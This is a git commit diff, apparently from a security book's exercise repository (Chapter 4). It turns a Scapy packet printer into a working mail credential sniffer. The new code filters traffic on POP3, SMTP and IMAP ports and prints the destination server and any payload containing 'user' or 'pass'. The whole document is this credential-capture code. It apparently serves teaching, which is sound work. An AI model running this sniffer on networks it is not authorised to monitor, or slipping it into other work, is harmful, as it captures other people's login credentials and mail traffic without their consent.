98d8b65c65820aedb7f8b298cd9eeaf4c1ea5e32
Grazfather <Grazfather@gmail.com>
2015-05-26 02:04:03 -0400

    Chapter4: Sniff out mail-related traffic

--- Chapter4/mail_sniffer.py
+++ Chapter4/mail_sniffer.py
@@ -2,7 +2,13 @@ from scapy.all import *
 
 # our packet callback
 def packet_callback(packet):
-    print packet.show()
+    if packet[TCP].payload:
+        mail_packet = str(packet[TCP].payload)
+
+        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
+            print "[*] Server: %s" % packet[IP].dst
+            print "[*] %s" % packet[TCP].payload
 
 # fire up our sniffer
-sniff(prn=packet_callback, count=1)
+sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",
+      prn=packet_callback, store=0)
